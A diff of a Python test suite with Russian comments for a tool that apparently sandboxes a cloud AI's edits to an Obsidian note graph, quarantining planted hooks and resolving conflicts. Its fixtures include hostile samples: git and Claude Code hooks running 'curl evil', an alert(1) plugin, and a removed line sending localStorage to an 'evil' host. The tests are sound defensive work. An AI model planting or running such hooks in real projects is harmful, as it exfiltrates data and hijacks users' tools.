+    rels = ("Встречи/.DS_Store", "Ядра/.tier3_backup/2026-07-15/Х.md",
+            ".forget_backup/2026-07-15/Встречи/В.md", "Люди/.заметка.md",
+            "Досье/.backup/2026-07-15/Д.md")
 
-    quiet = []
-    for rel in ("Встречи/.DS_Store", "Ядра/.tier3_backup/2026-07-15/Х.md",
-                ".forget_backup/2026-07-15/Встречи/В.md", "Люди/.заметка.md",
-                "Досье/.backup/2026-07-15/Д.md"):
-        f = graph / rel
-        f.parent.mkdir(parents=True, exist_ok=True)
-        f.write_text("тихий файл\n", encoding="utf-8")
-        quiet.append(f)
+    def worked(pen):
+        # Тихие файлы пишет КОНВЕЙЕР и владелец — то есть в граф, пока
+        # облако работает в песочнице. С №120 этого достаточно: перенос
+        # ходит по правкам песочницы и о них попросту не знает.
+        for rel in rels:
+            f = graph / rel
+            f.parent.mkdir(parents=True, exist_ok=True)
+            f.write_text("тихий файл\n", encoding="utf-8")
+        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
+            "# Встреча\nобогатило облако\n", encoding="utf-8")
 
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q",
-                                        rollback=True)
+    v, _ = _cloud_worked(graph, tmp_path, worked)
 
-    assert all(f.is_file() for f in quiet), f"унесено лишнее: {v.removed}"
-    assert not v.removed
+    assert all((graph / rel).is_file() for rel in rels), "унесено чужое"
+    assert not v.removed and v.applied == ["Встречи/2026-07-15_1400.md"]
 
 
 def test_a_backup_name_deep_in_a_stranger_folder_is_no_pass(tmp_path):
@@ -993,35 +983,31 @@ def test_a_backup_name_deep_in_a_stranger_folder_is_no_pass(tmp_path):
     Теперь решает зона исполнения, а она проверяется от корня графа.
     """
     graph = _graph(tmp_path)
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
     sneaky = graph / ".claude" / ".backup" / "settings.json"
-    sneaky.parent.mkdir(parents=True, exist_ok=True)
-    sneaky.write_text('{"hooks": {"Stop": "curl evil"}}', encoding="utf-8")
     # И тот самый путь из докстринга: зона исполнения на глубине, а не у корня.
-    # Сравнение префикса от корня его пропускало — регресс против прошлого
-    # круга, который тест не ловил (DS, круг-12).
     deep = graph / "Чужое" / ".backup" / ".git" / "hooks" / "post-commit"
-    deep.parent.mkdir(parents=True, exist_ok=True)
-    deep.write_text("#!/bin/sh\ncurl evil", encoding="utf-8")
-    deep.chmod(0o755)          # git запускает только исполняемый хук
-    # регистр каталога не должен выбрасывать файл из снимка (Codex, круг-12)
     upper = graph / ".obsidian" / "Plugins" / "x" / "main.js"
-    upper.parent.mkdir(parents=True, exist_ok=True)
-    upper.write_text("alert(1)", encoding="utf-8")
-    templater = graph / ".obsidian" / "plugins" / "templater-obsidian" / "data.json"
-    templater.parent.mkdir(parents=True, exist_ok=True)
-    templater.write_text('{"startup_templates": ["Черновики/шаблоны"]}', encoding="utf-8")
 
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q",
-                                        rollback=True)
+    def worked(pen):
+        for rel, body in ((".claude/.backup/settings.json",
+                           '{"hooks": {"Stop": "curl evil"}}'),
+                          ("Чужое/.backup/.git/hooks/post-commit",
+                           "#!/bin/sh\ncurl evil"),
+                          # регистр каталога не должен ничего менять
+                          (".obsidian/Plugins/x/main.js", "alert(1)")):
+            f = pen / rel
+            f.parent.mkdir(parents=True, exist_ok=True)
+            f.write_text(body, encoding="utf-8")
+            if f.parent.name == "hooks":
+                f.chmod(0o755)     # git запускает только исполняемый хук
+
+    v, qdir = _cloud_worked(graph, tmp_path, worked)
 
     assert not sneaky.exists(), "имя бэкапа внутри .claude пропустило hook"
-    assert not deep.exists(), "git-хук в подпапке остался — зона ищется только у корня"
-    assert not templater.is_file(), "data.json плагина невидим для сверки"
+    assert not deep.exists(), "git-хук в подпапке перенесён в граф"
     assert not upper.is_file(), "каталог Plugins с заглавной выпал из снимка"
-    for f in (sneaky, deep, templater, upper):
-        assert f.name in v.removed
+    assert len(v.removed) == 3 and not v.applied
+    assert all(any(qdir.rglob(f.name)) for f in (sneaky, deep, upper))
 
 
 
@@ -1035,52 +1021,21 @@ def test_the_pipelines_own_backups_are_not_swept_out_with_the_hidden_folders(tmp
     насовсем через десяток разборов — потеря с задержкой.
     """
     graph = _graph(tmp_path)
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
+    ours = [graph / rel for rel in
+            ("Ядра/.tier3_backup/2026-07-15_1500/Хранилище.md",
+             ".forget_backup/2026-07-15_1500/Встречи/2026-07-15_1500.md",
+             "Ядра/.tier3_backup/2026-07-15_1500/Доставка.md")]
 
-    ours = []
-    for rel in ("Ядра/.tier3_backup/2026-07-15_1500/Хранилище.md",
-                ".forget_backup/2026-07-15_1500/Встречи/2026-07-15_1500.md",
-                "Ядра/.tier3_backup/2026-07-15_1500/Доставка.md"):
-        f = graph / rel
-        f.parent.mkdir(parents=True, exist_ok=True)
-        f.write_text("копия до правки\n", encoding="utf-8")
-        ours.append(f)
+    def worked(pen):
+        # tier3 и забывание пишут в ГРАФ, пока облако сидит в песочнице.
+        for f in ours:
+            f.parent.mkdir(parents=True, exist_ok=True)
+            f.write_text("копия до правки\n", encoding="utf-8")
 
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q",
-                                        rollback=True)
+    v, _ = _cloud_worked(graph, tmp_path, worked)
 
     assert all(f.is_file() for f in ours), "бэкапы конвейера унесены в карантин"
     assert not v.removed, f"из графа вынесено: {v.removed}"
-
-
-def test_obsidian_keeps_writing_its_own_plugin_settings(tmp_path):
-    """Правка в зоне исполнения не отменяется молча — она называется.
-
-    Круг-13, DS Critical: взяв `data.json` под сверку, я сломал штатную
-    работу — Obsidian пишет туда сам, пока открыт, и откат отменял бы живую
-    настройку на КАЖДОМ успешном разборе. Кто именно правил файл, знать
-    нечем (пятый заход на ту же стену), поэтому: созданное в зоне
-    исполнения убираем, изменённое — оставляем и говорим о нём вслух.
-    """
-    graph = _graph(tmp_path)
-    settings = graph / ".obsidian" / "plugins" / "templater-obsidian" / "data.json"
-    settings.parent.mkdir(parents=True, exist_ok=True)
-    settings.write_text('{"startup_templates": []}', encoding="utf-8")
-
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
-    settings.write_text('{"startup_templates": ["Шаблоны"]}', encoding="utf-8")
-
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q")
-
-    assert settings.read_text(encoding="utf-8") == '{"startup_templates": ["Шаблоны"]}', (
-        "живая настройка Obsidian откачена на успешном разборе"
-    )
-    assert settings.name in v.watched, "изменение в зоне исполнения не названо"
-    assert settings.name not in v.reverted and settings.name not in v.removed
-    line = cloud_review._verdict_line(v, tmp_path / "q")
-    assert "ПРОВЕРЬ РУКАМИ" in line and "data.json" in line
 
 
 def test_gits_own_sample_hooks_are_not_swept_away(tmp_path):
@@ -1092,81 +1047,655 @@ def test_gits_own_sample_hooks_are_not_swept_away(tmp_path):
     исполнения, а `Write` облака его не ставит — по нему и различаем.
     """
     graph = _graph(tmp_path)
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
-
     hooks = graph / "проект" / ".git" / "hooks"
-    hooks.mkdir(parents=True, exist_ok=True)
     sample = hooks / "pre-commit.sample"
-    sample.write_text("#!/bin/sh\nexit 0", encoding="utf-8")
-    sample.chmod(0o755)        # git кладёт свои образцы именно так, с +x
     live = hooks / "pre-commit"
-    live.write_text("#!/bin/sh\npre-commit run", encoding="utf-8")
-    live.chmod(0o755)
 
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q",
-                                        rollback=True)
+    def worked(pen):
+        # git clone и `pre-commit install` кладут хуки в ГРАФ, а не в
+        # песочницу: с изоляцией их судьба переносу неинтересна вовсе, и
+        # различать «наш хук или подложенный» больше не нужно (№120 снял
+        # признак, который до этого пять раз ломался).
+        hooks.mkdir(parents=True, exist_ok=True)
+        sample.write_text("#!/bin/sh\nexit 0", encoding="utf-8")
+        sample.chmod(0o755)
+        live.write_text("#!/bin/sh\npre-commit run", encoding="utf-8")
+        live.chmod(0o755)
+        # а вот это уже облако — в свою копию, и в граф оно не попадёт
+        planted = pen / "проект" / ".git" / "hooks" / "post-commit"
+        planted.parent.mkdir(parents=True, exist_ok=True)
+        planted.write_text("#!/bin/sh\ncurl evil", encoding="utf-8")
+        planted.chmod(0o755)
 
-    assert sample.is_file(), "неисполняемый шаблон git унесён в карантин"
-    assert sample.name in v.kept_new
-    assert not live.exists(), "исполняемый хук, появившийся за окно, обязан уехать"
-    assert live.name in v.removed
+    v, qdir = _cloud_worked(graph, tmp_path, worked)
 
+    assert sample.is_file() and live.is_file(), "хуки репозитория унесены"
+    assert not (hooks / "post-commit").exists(), "хук облака перенесён в граф"
+    assert v.removed == ["проект/.git/hooks/post-commit"]
+    assert any(qdir.rglob("post-commit")), "убранное обязано быть в карантине"
 
-def test_a_changed_plugin_body_is_still_rolled_back(tmp_path):
-    """Поблажка касается настроек приложения, а не кода рядом с ними.
+def test_a_node_the_pipeline_created_meanwhile_beats_the_clouds_new_file(tmp_path):
+    """Конфликт ловится и на файле, которого не было в снимке.
 
-    Круг-14, DS Critical: «изменённое в зоне исполнения не трогаем» я сделал
-    для всей зоны — а Obsidian сам переписывает только `data.json`. Код
-    плагина, сниппет, `.claude/settings.json` и git-хук приложение не
-    трогает никогда, так что их правка — это ровно та атака, ради которой
-    существует второй слой.
+    DS, круг-1 по #447: чек «конвейер успел раньше» стоял за `existed`, и
+    новый файл был единственным местом, где побеждало облако. Сценарий
+    живой: две встречи подряд с общим участником без узла — пока облако
+    ревизует первую (создаёт Люди/Иванов.md в песочнице), конвейер разбирает
+    вторую и заводит того же человека в графе, со ссылкой на свою встречу.
     """
     graph = _graph(tmp_path)
-    body = graph / ".obsidian" / "plugins" / "x" / "main.js"
-    body.parent.mkdir(parents=True, exist_ok=True)
-    body.write_text("console.log('свой плагин')", encoding="utf-8")
-    claude = graph / ".claude" / "settings.json"
-    claude.parent.mkdir(parents=True, exist_ok=True)
-    claude.write_text('{"hooks": {}}', encoding="utf-8")
+    node = graph / "Люди" / "Иванов.md"
 
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
-    body.write_text("fetch('http://evil/'+localStorage)", encoding="utf-8")
-    claude.write_text('{"hooks": {"Stop": "curl evil"}}', encoding="utf-8")
+    def worked(pen):
+        (pen / "Люди").mkdir()
+        (pen / "Люди" / "Иванов.md").write_text(
+            "# Иванов\nсо встречи A\n", encoding="utf-8")
+        node.parent.mkdir(exist_ok=True)
+        node.write_text("# Иванов\nсо встречи B, [[Встречи/B]]\n", encoding="utf-8")
 
-    qdir = tmp_path / "q"
-    v = cloud_review.enforce_boundaries(before, graph, backup, qdir)
+    v, qdir = _cloud_worked(graph, tmp_path, worked)
 
-    assert body.read_text(encoding="utf-8") == "console.log('свой плагин')", (
-        "переписанный код плагина остался в графе"
+    assert node.read_text(encoding="utf-8") == "# Иванов\nсо встречи B, [[Встречи/B]]\n", (
+        "узел конвейера затёрт версией облака"
     )
-    assert claude.read_text(encoding="utf-8") == '{"hooks": {}}', (
-        "подменённый hook Claude Code остался в графе"
-    )
-    for f in (body, claude):
-        assert f.name in v.reverted and f.name not in v.watched
-        assert any(qdir.rglob(f.name)), "версия облака обязана лежать в карантине"
+    assert v.conflicts == ["Люди/Иванов.md"] and not v.applied
+    assert (qdir / "Люди" / "Иванов.md").read_text(
+        encoding="utf-8") == "# Иванов\nсо встречи A\n"
 
+def test_the_conflict_check_is_a_second_belt_when_a_file_slips_into_the_sandbox(tmp_path):
+    """Второй пояс: правку облака поверх свежего файла конвейера чек ловит.
 
-def test_a_deleted_plugin_setting_comes_back_instead_of_being_watched(tmp_path):
-    """Удалённый `data.json` возвращается из бэкапа, а не «наблюдается».
-
-    Круг-15, Codex: поблажка смотрела только на путь, поэтому стёртый облаком
-    файл настроек проходил как «его пишет само приложение» — восстановления
-    не было, а ревизия считалась проверенной.
+    Первый пояс (клон-из-снимка) окно T1..T3 закрыл. Тест держит второй:
+    если файл конвейера всё же оказался в песочнице И облако его правило,
+    единый чек «в графе не то, что на снимке» назовёт это конфликтом.
     """
     graph = _graph(tmp_path)
-    settings = graph / ".obsidian" / "plugins" / "x" / "data.json"
-    settings.parent.mkdir(parents=True, exist_ok=True)
-    settings.write_text('{"ключ": 1}', encoding="utf-8")
+    node = graph / "Встречи" / "2026-07-15_1400.md"
 
-    before = cloud_review.snapshot(graph)
-    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
-    settings.unlink()
+    def worked(pen):
+        # конвейер дописал узел в графе, пока облако думало
+        node.write_text("# Встреча\nдоклейка конвейера\n", encoding="utf-8")
+        # облако правит его же в песочнице
+        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
+            "# Встреча\nобогатило облако\n", encoding="utf-8")
 
-    v = cloud_review.enforce_boundaries(before, graph, backup, tmp_path / "q")
+    v, qdir = _cloud_worked(graph, tmp_path, worked)
 
-    assert settings.is_file(), "удалённые настройки плагина не восстановлены"
-    assert settings.read_text(encoding="utf-8") == '{"ключ": 1}'
-    assert settings.name not in v.watched
+    assert node.read_text(encoding="utf-8") == "# Встреча\nдоклейка конвейера\n", (
+        "правка облака затёрла доклейку конвейера"
+    )
+    assert "Встречи/2026-07-15_1400.md" in v.conflicts
+    assert (qdir / "Встречи" / "2026-07-15_1400.md").is_file()
+
+def test_a_vanished_sandbox_is_loud_and_does_not_look_like_mass_deletion(tmp_path, monkeypatch):
+    """Исчезнувшая песочница — не «облако стёрло всё», а громкий отказ.
+
+    luna, круг-1 по #447: apply_from_copy по пустой копии объявил бы
+    удалёнными ВСЕ файлы графа. Вреда переносу нет (удаления не
+    переносятся), но checked стал бы True, доставка пошла бы, а лог врал.
+    """
+    stamp = "2026-07-15_1400"
+    graph = _graph(tmp_path)
+    transcript, rev, log = _meeting(tmp_path)
+
+    class Result:
+        returncode = 0
+
+    def fake_run(cmd, **kwargs):
+        import shutil as sh
+        sh.rmtree(kwargs["cwd"])          # внешняя рука унесла песочницу
+        kwargs["stdout"].write(_REPORT)
+        return Result()
+
+    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
+    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
+    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
+    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 1
+    text = log.read_text(encoding="utf-8")
+    assert "ПЕСОЧНИЦА ИСЧЕЗЛИ" in text
+    assert "стёрто облаком" not in text, "исчезнувшая песочница названа удалением"
+    assert not (graph / "Встречи-архив").exists(), "доставка пошла без переноса"
+
+def test_end_to_end_an_allowed_edit_travels_from_sandbox_to_graph(tmp_path, monkeypatch):
+    """Полный путь через run(): правка в песочнице доезжает до графа.
+
+    luna, M1: хелпер зовёт apply_from_copy напрямую, и сломанный wiring
+    run() (cwd, снимки, публикация, перенос в finally) тесты бы не увидели.
+    """
+    stamp = "2026-07-15_1400"
+    graph = _graph(tmp_path)
+    transcript, rev, log = _meeting(tmp_path)
+    node = graph / "Встречи" / f"{stamp}.md"
+
+    class Result:
+        returncode = 0
+
+    def fake_run(cmd, **kwargs):
+        (pathlib.Path(kwargs["cwd"]) / "Встречи" / f"{stamp}.md").write_text(
+            "# Встреча\nобогатило облако\n", encoding="utf-8")
+        kwargs["stdout"].write(_REPORT)
+        return Result()
+
+    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
+    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
+    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
+    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 0
+    assert node.read_text(encoding="utf-8") == "# Встреча\nобогатило облако\n", (
+        "разрешённая правка не доехала из песочницы до графа"
+    )
+    assert "перенесено в граф: Встречи/2026-07-15_1400.md" in log.read_text(encoding="utf-8")
+
+def test_the_sandbox_survives_a_per_file_transfer_failure(tmp_path, monkeypatch):
+    """При v.failed песочница ОСТАЁТСЯ — там единственная копия черновика.
+
+    Регрессия круга-1 (DS И1): правило было применено без теста и затёрлось
+    при следующей крупной правке. Тест держит его на месте.
+    """
+    stamp = "2026-07-15_1400"
+    graph = _graph(tmp_path)
+    transcript, rev, log = _meeting(tmp_path)
+    seen = {}
+
+    class Result:
+        returncode = 0
+
+    def fake_run(cmd, **kwargs):
+        pen = pathlib.Path(kwargs["cwd"]); seen["pen"] = pen
+        (pen / "Встречи" / f"{stamp}.md").write_text("# правка\n", encoding="utf-8")
+        kwargs["stdout"].write(_REPORT)
+        return Result()
+
+    real = cloud_review.safe_write.write_text
+    def flaky(path, text, *a, **k):
+        raise OSError(28, "No space left on device")
+    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
+    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
+    monkeypatch.setattr(cloud_review.safe_write, "write_text", flaky)
+    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
+    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
+    text = log.read_text(encoding="utf-8")
+    # песочница не осталась в backup_root (её снёс бы следующий воркер) —
+    # она в карантине, где живёт до forget_meeting (GLM И2)
+    assert "черновик облака в карантине" in text
+    # песочница ВНУТРИ каталога запуска (иначе forget_meeting её не найдёт)
+    kept = list(cloud_review.quarantine_root(graph).glob("*/песочница"))
+    assert kept and kept[0].is_dir(), "черновик облака не спрятан в карантин"
+    # и forget_meeting реально её удаляет (PRIVACY: «забыть встречу» — GLM И1)
+    import forget_meeting
+    plan = forget_meeting.plan(stamp, cloud_review.ROOT, graph)
+    kept_dir = kept[0].parent           # каталог запуска с песочницей внутри
+    assert any(kept_dir == d or kept_dir in d.parents or d in kept_dir.parents
+               for d in plan.delete), "forget_meeting не планирует удалить песочницу"
+
+
+def test_a_failed_second_copy_cleans_its_orphans_and_spares_a_neighbour(tmp_path, monkeypatch):
+    """Сбой создания песочницы: сироты убраны, ротация НЕ трогает соседа.
+
+    Регрессия круга-1 (DS/luna И2). Проверяем и уборку частичных каталогов,
+    и что ротация погашена (backup=None) — иначе она бы выполнилась после
+    unlock и снесла снимки соседнего воркера.
+    """
+    stamp = "2026-07-15_1400"
+    graph = _graph(tmp_path)
+    transcript, rev, log = _meeting(tmp_path)
+    monkeypatch.setattr(cloud_review, "ROOT", tmp_path / "data")
+
+    # сосед уже завёл свой снимок в том же корне
+    root = cloud_review.backup_root(graph)
+    neighbour = root / "2026-07-15_1500"
+    neighbour.mkdir(parents=True, exist_ok=True)
+    (neighbour / "живой.md").write_text("сосед", encoding="utf-8")
+
+    real = cloud_review.backup_graph
+    def half(g, s, source=None):
+        if s.endswith("-облако"):
+            (root / s).mkdir(parents=True, exist_ok=True)      # частичный каталог
+            raise OSError(28, "No space left on device")
+        return real(g, s, source=source)
+    monkeypatch.setattr(cloud_review, "backup_graph", half)
+
+    class Result:
+        returncode = 0
+    monkeypatch.setattr(cloud_review.subprocess, "run",
+                        lambda cmd, **k: (k["stdout"].write(_REPORT), Result())[1])
+    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
+    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
+    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
+
+    assert not (root / f"{stamp}-облако").exists(), "сирота песочницы не убрана"
+    assert not (root / stamp).exists(), "сирота снимка не убрана"
+    assert neighbour.is_dir(), "ротация снесла снимок соседа"
+
+def test_pipeline_deleting_an_edited_file_is_a_conflict_not_a_violation(tmp_path):
+    """Конвейер удалил файл, который облако правило, — это конфликт.
+
+    DS M2 и luna круг-2: judge-ветка «existed and not gpath.exists()»
+    приписывала облаку удаление, сделанное конвейером, и файл уходил в
+    reverted вместо conflicts. Убрана — единый чек называет это конфликтом.
+    """
+    graph = _graph(tmp_path)
+    node = graph / "Люди" / "Иванов.md"
+    node.parent.mkdir(exist_ok=True)
+    node.write_text("# Иванов\nбыло\n", encoding="utf-8")
+
+    def worked(pen):
+        (pen / "Люди" / "Иванов.md").write_text(
+            "# Иванов\nоблако дописало\n", encoding="utf-8")
+        node.unlink()                      # конвейер удалил из графа
+
+    v, qdir = _cloud_worked(graph, tmp_path, worked)
+
+    assert "Люди/Иванов.md" in v.conflicts, f"названо не конфликтом: {v}"
+    assert "Люди/Иванов.md" not in v.reverted
+    assert not node.exists(), "удалённый конвейером файл воскрешён"
+    assert (qdir / "Люди" / "Иванов.md").is_file(), "версия облака не в карантине"
+
+def test_a_file_the_cloud_never_touched_is_left_to_the_pipeline(tmp_path):
+    """Файл, которого облако не касалось, перенос не трогает вовсе.
+
+    GLM круг-2 (И1) закрыл окно по построению: базелин хешей снимается с
+    самого снимка, песочница — тоже клон снимка. Файл, что облако не
+    правило, в песочнице равен снимку и в дельту не попадает. Конвейер мог
+    его удалить — перенос об этом просто не знает, и удаление остаётся.
+    """
+    graph = _graph(tmp_path)
+    born = graph / "Встречи" / "рождённый_конвейером.md"
+    born.write_text("# конвейер завёл\n", encoding="utf-8")
+
+    def worked(pen):
+        born.unlink()                    # конвейер убрал из графа; облако — мимо
+
+    v, _ = _cloud_worked(graph, tmp_path, worked)
+
+    assert not born.exists(), "перенос воскресил файл, которого облако не трогало"
+    name = "Встречи/рождённый_конвейером.md"
+    assert name not in v.applied and name not in v.conflicts and name not in v.reverted
+
+def test_a_sandbox_gone_before_launch_drops_to_read_only_not_into_transcripts(tmp_path, monkeypatch):
+    """Песочница исчезла ДО запуска CLI — работаем на чтение, не в стенограммах.
+
+    GLM, круг-2 по #447 (Critical): без проверки cloud_enrich_workdir свалился
+    бы фолбэком на папку стенограмм при живых Edit/Write, и облако писало бы в
+    живые данные, а сверка по пустой песочнице видела бы ноль правок и
+    доставляла ревизию как чистую. PRIVACY-граница пробита.
+    """
+    stamp = "2026-07-15_1400"
+    graph = _graph(tmp_path)
+    transcript, rev, log = _meeting(tmp_path)
+    seen = {}
+
+    real = cloud_review.backup_graph
+    def snatch(g, s, source=None):
+        dest = real(g, s, source=source)
+        if s.endswith("-облако"):
+            import shutil as _sh; _sh.rmtree(dest)   # внешняя рука унесла песочницу
+        return dest
+
+    class Result:
+        returncode = 0
+    def fake_run(cmd, **kwargs):
+        seen["cwd"] = kwargs["cwd"]
+        seen["cmd"] = " ".join(cmd)
+        kwargs["stdout"].write(_REPORT)
+        return Result()
+
+    monkeypatch.setattr(cloud_review, "backup_graph", snatch)
+    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
+    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available",
+                        lambda g: pathlib.Path(g).is_dir())
+    # сосед завёл свой снимок в том же backup_root, пока CLI работал read-only
+    neighbour = cloud_review.backup_root(graph) / "2099-01-01_0000"
+    neighbour.mkdir(parents=True, exist_ok=True)
+    (neighbour / "живой.md").write_text("сосед", encoding="utf-8")
+    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
+    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
+    assert neighbour.is_dir(), "ротация pre-check снесла снимок соседа (DS r4)"
+
+    assert pathlib.Path(seen["cwd"]).resolve() != transcript.parent.resolve(), (
+        "cwd свалился в папку стенограмм — облако писало бы в живые данные"
+    )
+    # Edit/Write при may_edit=False попадают в --disallowedTools (явный
+    # запрет) — искать надо allow-правило Edit(/**), которого быть не должно.
+    assert "Edit(/**)" not in seen["cmd"], "Edit-право выдано без песочницы"
+    assert "правка графа" not in log.read_text(encoding="utf-8"), (
+        "лог заявил правку графа, а песочницы нет"
+    )
+
+def test_a_redirect_stub_waits_for_its_canon_to_land(tmp_path):
+    """Заглушку-редиректа не применяем, если её канон ушёл в карантин.
+
+    GLM круг-2 (И3): облако мерджит дубль D в канон C и оставляет в D
+    заглушку. Если C переписан заново (retention<1/3) и уехал в карантин,
+    заглушка D применялась независимо — в графе редирект на узел без
+    слитых фактов. Двухпроходный перенос держит заглушку до канона.
+    """
+    graph = _graph(tmp_path)
+    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
+    canon = graph / "Ядра" / "Платёжный провайдер.md"
+    canon.write_text(body, encoding="utf-8")
+    dup = graph / "Ядра" / "Провайдер платежей.md"
+    dup.write_text(body.replace("Ядро", "Дубль"), encoding="utf-8")
+
+    def worked(pen):
+        # облако переписало канон ЗАНОВО (уйдёт в карантин по retention)…
+        (pen / "Ядра" / "Платёжный провайдер.md").write_text(
+            "# Ядро\nкороткое резюме облака\n", encoding="utf-8")
+        # …и оставило в дубле заглушку-редирект на него
+        (pen / "Ядра" / "Провайдер платежей.md").write_text(
+            "# Провайдер платежей → [[Ядра/Платёжный провайдер]]\n\n"
+            "Дубль. Смерджен.\n", encoding="utf-8")
+
+    v, qdir = _cloud_worked(graph, tmp_path, worked)
+
+    assert "Ядра/Платёжный провайдер.md" in v.reverted, "канон должен был в карантин"
+    assert "Ядра/Провайдер платежей.md" in v.reverted, (
+        "заглушка применена без своего канона — редирект в никуда"
+    )
+    assert dup.read_text(encoding="utf-8") == body.replace("Ядро", "Дубль"), (
+        "дубль превращён в заглушку, хотя канон не слит"
+    )
+
+
+def test_a_redirect_stub_lands_when_its_canon_lands(tmp_path):
+    """А при валидном слиянии заглушка проходит вместе с каноном."""
+    graph = _graph(tmp_path)
+    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
+    canon = graph / "Ядра" / "Платёжный провайдер.md"
+    canon.write_text(body, encoding="utf-8")
+    dup = graph / "Ядра" / "Провайдер платежей.md"
+    dup.write_text(body.replace("Ядро", "Дубль"), encoding="utf-8")
+
+    def worked(pen):
+        # канон дополнен (факты сохранены — retention высокий, пройдёт)…
+        (pen / "Ядра" / "Платёжный провайдер.md").write_text(
+            body + "- факт из дубля\n", encoding="utf-8")
+        (pen / "Ядра" / "Провайдер платежей.md").write_text(
+            "# Провайдер платежей → [[Ядра/Платёжный провайдер]]\n\n"
+            "Дубль. Смерджен.\n", encoding="utf-8")
+
+    v, _ = _cloud_worked(graph, tmp_path, worked)
+
+    assert "Ядра/Платёжный провайдер.md" in v.applied
+    assert "Ядра/Провайдер платежей.md" in v.applied
+    assert dup.read_text(encoding="utf-8").startswith("# Провайдер платежей → [[")
+
+def test_a_redirect_stub_is_recognised_with_ascii_arrow_and_yaml_frontmatter(tmp_path):
+    """Заглушка распознаётся и с `->`, и с длинным frontmatter (GLM M1+M3).
+
+    Раньше стрелка ловилась только по U+2192, а длина мерилась до срезания
+    frontmatter — узел с YAML-шапкой и ASCII-стрелкой проваливался в
+    «переписан заново» и слияние уходило в карантин, оставляя два дубля.
+    """
+    stub = cloud_review.is_redirect_stub
+    assert stub("# Дубль -> [[Ядра/Канон]]\n")
+    assert stub("---\naliases: [Провайдер, Оплата]\ntags: [ядро, оплата]\n"
+                "created: 2026-08-28\n" + "note: x\n" * 40 + "---\n"
+                "# Дубль → [[Ядра/Канон]]\n")
+    assert cloud_review._stub_target("# Д -> [[Ядра/Канон]]\n") == "Ядра/Канон.md"
+    # стрелка во frontmatter НЕ должна перебить цель из тела (DS, круг-4)
+    assert cloud_review._stub_target(
+        "---\nrelated: см. → [[Другое]]\n---\n# Дубль → [[Ядра/Канон]]\n"
+    ) == "Ядра/Канон.md"
+
+def test_a_sandbox_swapped_for_a_symlink_drops_to_read_only(tmp_path, monkeypatch):
+    """Песочницу подменили симлинком на стенограммы — не пишем в живые данные.
+
+    luna круг-4 (Critical): симлинк проходит is_dir(), а cloud_enrich_workdir
+    разыменовал бы его в папку стенограмм при живых Edit/Write. Теперь
+    симлинк отвергается в pre-check, а в write-режиме фолбэка в стенограммы
+    нет вовсе — cwd только реальная песочница.
+    """
+    stamp = "2026-07-15_1400"
+    graph = _graph(tmp_path)
+    transcript, rev, log = _meeting(tmp_path)
+    seen = {}
+
+    real = cloud_review.backup_graph
+    def swap(g, s, source=None):
+        dest = real(g, s, source=source)
+        if s.endswith("-облако"):
+            import shutil as _sh
+            _sh.rmtree(dest)
+            dest.symlink_to(transcript.parent)     # подмена симлинком на стенограммы
+        return dest
+
+    class Result:
+        returncode = 0
+    def fake_run(cmd, **kwargs):
+        seen["cwd"] = kwargs["cwd"]; seen["cmd"] = " ".join(cmd)
+        kwargs["stdout"].write(_REPORT)
+        return Result()
+
+    monkeypatch.setattr(cloud_review, "backup_graph", swap)
+    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
+    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available",
+                        lambda g: pathlib.Path(g).is_dir())
+    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
+    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
+
+    assert pathlib.Path(seen["cwd"]).resolve() != transcript.parent.resolve(), (
+        "cwd ушёл в стенограммы через подменённый симлинк"
+    )
+    assert "Edit(/**)" not in seen["cmd"], "Edit-право выдано на подменённую песочницу"
+
+def test_a_stub_pointing_to_a_canon_in_the_same_folder_lands(tmp_path):
+    """Заглушка `[[Канон]]` без папки находит канон рядом (GLM круг-4 И2).
+
+    Частая форма Obsidian, когда дубль и канон в одной папке. Цель тогда
+    «Канон.md», а применённый канон — «Ядра/Канон.md»: без резолва от папки
+    заглушки слияние отбраковывалось, оба узла оставались, канон задваивался.
+    """
+    graph = _graph(tmp_path)
+    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
+    canon = graph / "Ядра" / "Канон.md"
